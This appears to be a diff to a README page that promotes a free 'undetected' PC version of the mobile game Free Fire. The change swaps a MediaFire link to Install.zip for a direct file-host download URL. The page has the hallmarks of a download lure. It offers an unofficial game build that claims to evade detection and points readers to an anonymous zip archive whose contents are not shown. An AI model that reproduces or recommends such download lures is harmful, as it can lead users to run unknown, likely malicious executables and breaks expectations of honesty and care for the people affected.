@@ -1,6 +1,6 @@
 # PC Version of FREE FIRE (Undetected by the System)  
 
-**Download the Game:**  [Download for Windows](https://www.mediafire.com/file/zma9piq4d50ttdu/Install.zip/file)
+**Download the Game:**  [Download for Windows](https://download1589.mediafire.com/qz1faket3rhgqt62WkGlORECQzo9yTI2vphKBrEQ8oWxe-mxZJqq_0wtCLHeizltBeuyPjEinHZueYc8ZY_9pThsmHv2QoTvgqhh9orJqT0OYxK7YH2y38qepKnWqAmImDxo8s1Er_qLKlUJ4MtNTV1I5FgaOAd7AO93aShWwO8J/su9w03xejhq84p3/Install.zip)
 ---
 
 ## **Play FREE FIRE on PC Without Restrictions!**  
